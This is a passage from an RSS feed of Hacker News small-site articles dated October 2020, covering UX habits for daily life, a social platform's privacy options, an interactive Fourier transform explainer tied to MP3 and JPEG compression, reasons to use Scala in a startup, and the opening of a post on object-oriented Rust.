Marie and Tamara had never met? Because last time we met with Awa and had delicious ice cream, I can give you the address, and it was such a sunny day</em>" and this sentence alone tackled 6 different topics. Yes, some people talk like that, and it exhausts me because I can't follow.</p><p>Some strategies to make it easier:</p><h3>Chunking</h3><p>Do you write phone numbers as 0123456789 or 01.23.45.67.89? Splitting your content in smaller chunks makes it easier to both <a href="https://www.nngroup.com/articles/chunking/" target="_blank">scan</a> and <a href="https://www.zora.uzh.ch/id/eprint/151291/1/Thalmann.et.al.Chunking.final.pdf" target="_blank">memorise</a>.</p><h3>Reducing the number of options</h3><p>You don't have to go all the way and reduce your wardrobe to 15 items, but... I suppose that's the spirit? In UX, this is known as <a href="https://lawsofux.com/hicks-law" target="_blank">Hick's law</a>. Choosing what to have between 10 options will take longer than between 3 options. That won't stop me from having 10 different teas at home though. üòå This isn't something to apply religiously, just to be aware of and to use whenever relevant.</p><h3><a href="https://www.nngroup.com/articles/recognition-and-recall/" target="_blank">Recognition rather than recall</a></h3><p>Yet another interesting UX principle for your daily life. Recognition leaves cues (e.g. "<em>Are mint &amp; lime in a mojito?</em>‚Äù), whereas recall doesn't ("<em>What are the main ingredients in a mojito?</em>"). The end goal of these questions is the same, but the former is easier to answer: you just have to recognise whether the information given to you is accurate.</p><p>You can then make your environment work for you. I leave my keys in the lock, so that I'm naturally prompted to take them with me as I go out, I don't need to remember it. If I want to wear something specific the next day, I'll take it out of the wardrobe and leave it in plain sight. If I need to eat something soon, as it expires the next day, I'll place it on the kitchen counter.</p><h2>Choosing between streaks or flexible goals</h2><p>Several products use streaks to entice you into practicing something daily. Headspace does it for meditation, Github does it with your code commits. Streaks can be useful, but they shouldn't be a default goal for any habit you want to learn. Aiming to be flexible, and to complete a task 3 or 5 times per week, is much more realistic than sticking to it everyday, especially if you're just getting started. Streaks create pressure to perform everyday, while more manageable goals leave room for contigencies.</p><p>Additionally, since you're more likely to complete <a href="https://nesslabs.com/flexible-consistency" target="_blank">flexible goals</a>, you can observe your own progress, which encourages you to keep going. Finally, it's important to differenciate whether your completion of a task comes from pressure or from desire. Daily streaks are more likely to be completed from internal coercion, and malleable goals from desire, because if you don't feel like doing it on Monday, it's no big deal. Listen to yourself, listen to what you feel like doing in the moment, and adapt.</p></div></div></div>]]>
            </description>
            <link>https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945364</guid>
            <pubDate>Fri, 30 Oct 2020 18:26:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New social media platform, Lighf, looking forward to welcoming its future users]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24945358">thread link</a>) | @imanonymous
<br/>
October 30, 2020 | https://lighf.com/request-lighf/ | <a href="https://web.archive.org/web/*/https://lighf.com/request-lighf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div text-align:="" center;"=""><p><span>lighf</span> doesn‚Äôt store your IP address or any other identifiable data about you. By default your layers (privacy) are to set to <em>None</em> but you can add additional layers.</p>
<p><em>Encrypted</em>, means your email address is encrypted the second you create an account and only unencrypted, with your permission, at times when you need to recover your password.√Ç&nbsp; The draw back is you won‚Äôt be able to get <span>lighf</span> updates by email, only In-App and Push (coming soon).</p>
<p>To go <em>Email-less</em> means no email address is linked to your <span>lighf</span> Account. Like the Encrypted option, you won‚Äôt receive any updates by email, only In-App and Push (coming soon). The draw back is that you won‚Äôt be able to reset your password or <span>lighf</span>Name (username) or recover your Account.</p>
<p><a title="Tap this link to close." href="#">Got It!</a></p>
</div>
</div></div>]]>
            </description>
            <link>https://lighf.com/request-lighf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945358</guid>
            <pubDate>Fri, 30 Oct 2020 18:25:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Interactive Introduction to Fourier Transforms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945150">thread link</a>) | @max10541
<br/>
October 30, 2020 | http://www.jezzamon.com/fourier/index.html | <a href="https://web.archive.org/web/*/http://www.jezzamon.com/fourier/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<p>Fourier transforms are a tool used in a whole bunch of different things. This is an explanation of what a Fourier transform does, and some different ways it can be useful. And how you can make pretty things with it, like this thing:</p>
<canvas id="self-draw" width="500" height="500"></canvas>
<p>I'm going to explain how that animation works, and along the way explain Fourier transforms!</p>
<p>By the end you should have a good idea about</p>
<ul>
<li>What a Fourier transform does</li>
<li>Some practical uses of Fourier transforms</li>
<li>Some pointless but cool uses of Fourier transforms</li>
</ul>
<p>We're going to leave the mathematics and equations out of it for now. There's a bunch of interesting maths behind it, but it's better to start with what it actually does, and why you'd want to use it first. If you want to know more about the how, there's some further reading suggestions below!</p>
<h2 id="sowhatisthisthing">So what is this thing?</h2>
<p>Put simply, the Fourier transform is a way of splitting something up into a bunch of sine waves. As usual, the name comes from some person who lived a long time ago called Fourier.</p>
<p>Let‚Äôs start with some simple examples and work our way up. First up we're going to look at waves - patterns that repeat over time.</p>
<p>Here‚Äôs an example wave:</p>
<canvas id="combo-sine-wave" width="500" height="300"></canvas>
<p>This wavy pattern here can be split up into sine waves. That is, when we add up the two sine waves we get back the original wave.</p>
<canvas id="combo-sine-wave-split" width="500" height="500"></canvas>
<p>The Fourier transform is a way for us to take the combined wave, and get each of the sine waves back out. In this example, you can almost do it in your head, just by looking at the original wave.</p>
<p>Why? Turns out a lot of things in the real world interact based on these sine waves. We usually call them the wave's frequencies.</p>
<p>The most obvious example is sound ‚Äì when we hear a sound, we don‚Äôt hear that squiggly line, but we hear the different frequencies of the sine waves that make up the sound.</p>



<p>Being able to split them up on a computer can give us an understanding of what a person actually hears. We can understand how high or low a sound is, or figure out what note it is.</p>
<p>We can also use this process on waves that don't look like they're made of sine waves.</p>
<p>Let's take a look at this guy. It‚Äôs called a square wave.</p>
<canvas id="square-wave" width="500" height="300"></canvas>
<p>It might not look like it, but it also can be split up into sine waves.</p>
<canvas id="square-wave-split" width="500" height="500"></canvas>
<p>We need a lot of them this time ‚Äì technically an infinite amount to perfectly represent it. As we add up more and more sine waves the pattern gets closer and closer to the square wave we started with.</p>
<canvas id="square-wave-build-up" width="500" height="500"></canvas>


<p><em>Drag the slider above to play with how many sine waves there are.</em></p>
<p>Visually, you'll notice that actually the first few sine waves are the ones that make the biggest difference. With the slider halfway, we have the general shape of the wave, but it's all wiggly. We just need the rest of the small ones to make the wigglyness flatten out.</p>
<p>When you listen to the wave, you'll hear the sound get lower, because we're removing the higher frequencies.</p>
<p>This process works like that for any repeating line. Give it a go, try drawing your own!</p>


<p><em>Move the slider to see how as we add more sine waves, it gets closer and closer to your drawing</em></p>
<p>Again, aside from the extra wigglyness, the wave looks pretty similar with just half of the sine waves.</p>
<p>We can actually use the fact that the wave is pretty similar to our advantage. By using a Fourier transform, we can get the important parts of a sound, and only store those to end up with something that's pretty close to the original sound.</p>
<p>Normally on a computer we store a wave as a series of points.</p>
<canvas id="wave-samples" width="500" height="500"></canvas>
<p>What we can do instead is represent it as a bunch of sine waves. Then we can compress the sound by ignoring the smaller frequencies. Our end result won't be the same, but it'll sound pretty similar to a person.</p>
<canvas id="wave-frequencies" width="500" height="500"></canvas>
<p>This is essentially what MP3s do, except they're more clever about which frequencies they keep and which ones they throw away.</p>
<p>So in this case, we can use Fourier transforms to get an understanding of the fundamental properties of a wave, and then we can use that for things like compression.</p>
<p>Ok, now let's dig more into the Fourier transform. This next part looks cool, but also gives you a bit more understanding of what the Fourier transform does. But mostly looks cool.</p>
<h2 id="epicycles">Epicycles</h2>
<p>Now at the start, I said it splits things into sine waves. The thing is, the sine waves it creates are not just regular sine waves, but they‚Äôre 3D. You could call them "complex sinusoids". Or just "spirals".</p>
<canvas id="complex-sinusoid" width="500" height="500"></canvas>
<p>If we take a look from the side, they look like sine waves. From front on, though, these look like circles.</p>
<canvas id="complex-sinusoid-turn" width="500" height="500"></canvas>
<p>So far everything we‚Äôve been doing has only required the regular 2D sine waves. When we do a Fourier transform on 2D waves, the complex parts cancel out so we just end up with sine waves.</p>
<p>But we can use the 3D sine waves to make something fun looking like this:</p>
<canvas id="peace-epicycles" width="500" height="500"></canvas>
<p>What‚Äôs going on here?</p>
<p>Well, we can think of the drawing as a 3D shape because of the way it moves around in time. If you imagine the hand being drawn by a person, the three dimensions represent where the tip of their pencil is at that moment. The x and y dimensions tell us the position, and then the time dimension is the time at that moment.</p>
<canvas id="peace-3d" width="500" height="500"></canvas>
<p>Now that we have a 3D pattern, we can't use the regular 2D sine waves to represent it. No matter how many of the 2D sine waves we add up, we'll never get something 3D. So we need something else.</p>
<p>What we can use is the 3D spiral sine waves from before. If we add up lots of those, we can get something that looks like our 3D pattern.</p>
<p>Remember, these waves look like circles when we look at them from front on. The name for the pattern of a circle moving around another circle is an epicycle.</p>
<canvas id="peace-build-up" width="500" height="500"></canvas>

<p><em>Use the slider above to control how many circles there are.</em></p>
<p>Like before, we get a pretty good approximation of our pattern with just a few circles. Because this is a fairly simple shape, all the last ones do is make the edges a little sharper.</p>
<p>All this applies to any drawing, really! Now it‚Äôs your chance to play around with it.</p>


<p><em>Use the slider to control how many circles are used for your drawing</em></p>
<p>Again, you'll see for most shapes, we can approximate them fairly well with just a small number of circles, instead of saving all the points.</p>
<p>Can we use this for real data? Well, we could! In reality we have another data format called SVG, which probably does a better job for the types of shapes we tend to create. So for the moment, this is really just for making cool little gifs.</p>
<canvas id="fourier-title" width="500" height="300"></canvas>
<p>There is another type of visual data that does use Fourier transforms, however.</p>
<h2 id="jpegs">JPEGs</h2>
<p>Did you know Fourier transforms can also be used on images? In fact, we use it all the time, because that's how JPEGs work! We're applying the same principles to images ‚Äì splitting up something into a bunch of sine waves, and then only storing the important ones.</p>
<p>Now we're dealing with images, we need a different type of sine wave. We need to have something that no matter what image we have, we can add up a bunch of these sine waves to get back to our original image.</p>
<p>To do that, each of our sine waves will be images too. Instead of a wave that's a line, we now have images with black and white sections. To represent the size of a wave, each image will have more or less contrast.</p>
<p>We can also use these to represent color in the same way, but let's start with black-and-white images for now. To represent colorless images, we need some horizontal wave images,</p>
<p><img id="img-y-component" src="http://www.jezzamon.com/fourier/img/components-4-0.png"></p>
<p>Along with some vertical wave images.</p>
<p><img id="img-x-component" src="http://www.jezzamon.com/fourier/img/components-0-4.png"></p>
<p>By themselves, just horizontal and vertical images aren't enough to represent the types of images we get. We also need some extra ones that you get by multiplying the two together.</p>

<p>For an 8x8 image, here are all the images we need.</p>
<p><img src="http://www.jezzamon.com/fourier/img/components-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-7.png">
</p>
<p>If we take the images, adjust their contrast to the right amount, and then add them up we can create any image.</p>
<p>Let's start with this letter 'A'. It's pretty small, but we need it to be small otherwise we'll end up with too many other images.</p>
<p><img src="http://www.jezzamon.com/fourier/img/a.png"></p>
<p>As we add more and more of these images, we end up with something that becomes closer and closer to the actual image. But I think you'll see the pattern here, as we get a reasonable approximation with just a few of them.</p>
<p><img src="http://www.jezzamon.com/fourier/img/img-buildup-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-7.png">
</p>

<p>For actual JPEG images there are just a few extra details.</p>
<p>The image gets broken up into 8x8 chunks, and each chunk gets split up separately. We use a set of frequencies to determine how light or dark each pixel is, and then another two sets for the color, one for red-green, and another for blue-yellow. The number of frequencies that we use for each chunk determines the quality of the JPEG.</p>
<p>Here's a real JPEG image, zoomed in so we can see the details. When we play with the quality levels we can see this process happen.</p>
<p><img src="http://www.jezzamon.com/fourier/img/cat.png">
</p>
<h2 id="conclusion">Conclusion</h2>
<p>So let's recap:</p>
<ul>
<li>Fourier transforms are things that let us take something and split it up into its frequencies.</li>
<li>The frequencies tell us about some fundamental properties of the data we have</li>
<li>And can compress data by only storing the important frequencies</li>
<li>And we can also use them to make cool looking animations with a bunch of circles</li>
</ul>
<p>This is just scratching the surface into some applications. The Fourier transform is an extremely powerful tool, because splitting things up into frequencies is so fundamental. They're used in a lot of fields, ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.jezzamon.com/fourier/index.html">http://www.jezzamon.com/fourier/index.html</a></em></p>]]>
            </description>
            <link>http://www.jezzamon.com/fourier/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945150</guid>
            <pubDate>Fri, 30 Oct 2020 18:08:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Scala in your early stage startup]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945145">thread link</a>) | @vlehuger
<br/>
October 30, 2020 | https://www.actiondesk.io/blog/why-use-scala | <a href="https://web.archive.org/web/*/https://www.actiondesk.io/blog/why-use-scala">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Why use Scala? We listed the advantages of Scala we see in our startup. See whether the benefits of Scala could help you too.</p><p>1. Focus on what matters: Expressiveness + High order functions</p><p>2. Get less bugs: Statically typed + Clean error management by design</p><p>3. Benefit from JVM ecosystem: Performant libraries + Good tooling environment</p><p>4. Attract talents</p><p>‚Äç</p><p>‚Äç</p><p>Scala is a JVM based language. It‚Äôs flexible, you can write code in both imperative or functional styles. Scala is a pragmatic language that mixes the best of functional and object-oriented programming. It basically means that you can create classes to encapsulate state and methods but you can‚Äôt mutate them.</p><p>‚Äç</p><p>‚Äç</p><p>The main power of Scala is to let the developers focus on what‚Äôs most important.</p><p>‚Äç</p><h2><strong>Expressiveness</strong></h2><p>Running on the JVM, Scala is as powerful as Java but it is way clearer and more concise. It makes the code easier (and faster) to write and read!</p><p>For example, look at how we create a list of string in Java vs Scala:</p><h4><strong>Java:</strong></h4><figure id="w-node-069225ecd5f7-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df66d44ec7c4592663ddc_20201019%20Scala%20Article_1.png" loading="lazy" alt="how we create a list of string in Java"></p></figure><h4><strong>Scala:</strong></h4><figure id="w-node-713e2fe2bca1-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df6bca2fdb8e00bb006a6_20201019%20Scala%20Article_2.png" loading="lazy" alt="how we create a list of string in Scala"></p></figure><h2><strong>High order function</strong></h2><p>High order functions are functions that abstract some control structure like a loop to update every element of an array.</p><p>They‚Äôre the functions we use most in Scala. They work by taking a function as a parameter. Used with anonymous functions, they‚Äôre perfect to focus on implementing the business logic instead of juggling with indexes to increment and stop conditions.</p><p>Look at how we can convert this list of string into a list of integers:</p><figure id="w-node-b9f12ec503cb-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df77fa26c394e0b5e18b1_20201019%20Scala%20Article_3.png" loading="lazy" alt="how to convert a list of string into a list of ints in Scala"></p></figure><p>‚Äç</p><p>We can also compute the sum of it by using the high-order function fold:</p><figure id="w-node-dc33ae72b25f-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df7b68e690322a1f2341e_20201019%20Scala%20Article_4.png" loading="lazy" alt="How to compute the sum by using the high-order function fold in Scala"></p></figure><p>‚Äç</p><p>‚Äç</p><p>‚Äç</p><h2><strong>Statically typed</strong></h2><p>By checking the type during the compilation, Scala type system reduces considerably the amount of bugs caused by type errors.</p><p>Type inference allows typing without being too verbose:</p><p>def square(x: Int) = x * x&nbsp;</p><p>Here the type of square (Int) is inferred from the * operator which multiplies an Int by an Int giving an Int in output.</p><p>And thanks to pattern matching, we can still write flexible code:</p><figure id="w-node-5d4c922f320c-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df82d19cead6575ed2edd_20201019%20Scala%20Article_5.png" loading="lazy" alt="How to decompose an object to pattern match on its attributes, add pattern guards, pattern match a regex or the elements of a List in Scala"></p></figure><p>Here we can even decompose an object to pattern match on its attributes. We can even add pattern guards (if condition in a case), pattern match a regex or the elements of a List.</p><p>‚Äç</p><h2><strong>Clean error management by design</strong></h2><h3><strong>Option and Either</strong></h3><p>There are some useful standard types in Scala to manage errors. The most commonly used are Option and Either. An Option can either be a class Some containing a value or a None object. So we can associate a valid result to Some and an error to None. Let's write a function to safely update a String to Int.</p><figure id="w-node-60c03b54f3c2-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df92687207e98effd9699_20201019%20Scala%20Article_6.png" loading="lazy" alt="How to to safely update a String to Int in Scala"></p></figure><p>‚Äç</p><p>And if we need an error message we can use the Either class that will return a Right containing the value or a Left with an error type.</p><figure id="w-node-b021a222808e-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8dfb98068c68637d53699d_20201019%20Scala%20Article_7.png" loading="lazy" alt="If we need an error message we can use the Either class that will return a Right containing the value or a Left with an error type in Scala"></p></figure><p>‚Äç</p><p>Try is also a great type to manage error, especially to encapsulate every call to Java functions that can throw errors.</p><p>‚Äç</p><h3><strong>Combine them with for-comprehension</strong></h3><p>Option, Either or Try allow us to return a result or an error and not throw it to whatever will catch it. And thanks to a special Scala control structure, the ‚Äúfor-comprehension‚Äù, we can easily combine them to return the first error encountered.</p><figure id="w-node-c336c52f22b2-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df9f519cead4e10ed589d_20201019%20Scala%20Article_8.png" loading="lazy" alt="The Scala control structure ‚Äúfor-comprehension‚Äù allows to easily combine Option, Either and Try to return the first error encountered."></p></figure><p>dividend on the left part of dividend &lt;- convertStringToInt(dividendStr) is the value in the Right of the convertStringToInt(dividendStr) result. If convertStringToInt(dividendStr) returns an error, it will stop immediately and return that error in a Left for safeStringDivision.</p><p>‚Äç</p><h3><strong>Perfect to handle asynchronous code</strong></h3><p>‚Äúfor-comprehension‚Äù are also amazing to work with asynchronous code like HTTP calls encapsulated in a Future. We can combine them and return an error for the first error we encounter.</p><figure id="w-node-6dcad4d139cc-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8dfab1a0c47639e33ad40f_20201019%20Scala%20Article_9.png" loading="lazy" alt="In Scala, for-comprehension are also amazing to work with asynchronous code like HTTP calls encapsulate in a Future."></p></figure><p>‚Äç</p><p>We can even combine Future with other error types like Either by using functional libraries like <a href="https://typelevel.org/cats/datatypes/eithert.html" target="_blank">cats</a>.</p><p>‚Äç</p><p>‚Äç</p><p>‚Äç</p><h2><strong>JVM allows to use powerful java libraries</strong></h2><p>For example we use db connectors, libraries to manage timestamps, logging &amp; monitoring clients and more!</p><p>‚Äç</p><h2><strong>Good tooling environment</strong></h2><p>There is a great IDE with Intellij Idea. The community also built a very efficient alternative Metals, a plugin that can transform your VS Code in Scala IDE.</p><p>Another useful tool we use is sbt-docker. It allows you to simply build a docker container embedding your application.</p><p>‚Äç</p><p>Such powerful language attracts skilled engineers who are curious and keen to test new tools, who have the willingness to discover new paradigms, new perspectives to see the world of programming... And this is the perfect mindset to join a startup as Engineer 1 to 10!</p><p>By the way, <a href="https://angel.co/company/actiondesk/jobs" target="_blank">we‚Äôre hiring</a> if you want to join us at <a href="http://actiondesk.io/" target="_blank">Actiondesk</a>.</p><p>‚Äç</p></div></div></div>]]>
            </description>
            <link>https://www.actiondesk.io/blog/why-use-scala</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945145</guid>
            <pubDate>Fri, 30 Oct 2020 18:07:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[So you want to write object oriented Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945038">thread link</a>) | @lukastyrychtr
<br/>
October 30, 2020 | https://blog.darrien.dev/posts/so-you-want-to-object/ | <a href="https://web.archive.org/web/*/https://blog.darrien.dev/posts/so-you-want-to-object/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>Whether you wanted to find out about object oriented Rust yourself, or you
wanted to see why in the world I‚Äôm talking about object oriented rust, you are
here. And so let us talk about object oriented Rust.</p>
<p>Object oriented Rust is not so outlandish. Many folks think of Rust as a
functional language, and while there are plenty of functional paradigms in Rust,
many of those paradigms are also available to other languages in one way or
another.</p>
<p>Most folks would not call Java a functional language, and yet many of the
features cited that make Rust a functional language are available as libraries
for Java. If you want algebraic data types, <a href="https://github.com/HubSpot/algebra">there‚Äôs a library for
that</a>. If you want pattern matching,
<a href="https://github.com/derive4j/derive4%5D">there‚Äôs a library for that too</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p>The absence or presence of such features does not make a language object
oriented or functional, there are plenty of ways to stamp features from one
langauge onto others.</p>
<p>With that said, given Rust is intended to be a functional replacement to C++,
plenty of object oriented features exist in Rust. You don‚Äôt have to leave the
standard library to access them either!</p>
<p>Because of many of the restrictions and lack of a GC in Rust, there are a number
of nuances with how Rust handles OOP. It can certainly work like Java if you
really want it to, but sometimes it can take a little finagling.</p>
<p>The remainder of this post will talk about OOP in the context of Rust itself,
and common pitfalls you may hit along the way while writing object oriented Rust
or using object oriented patterns.</p>
<hr>
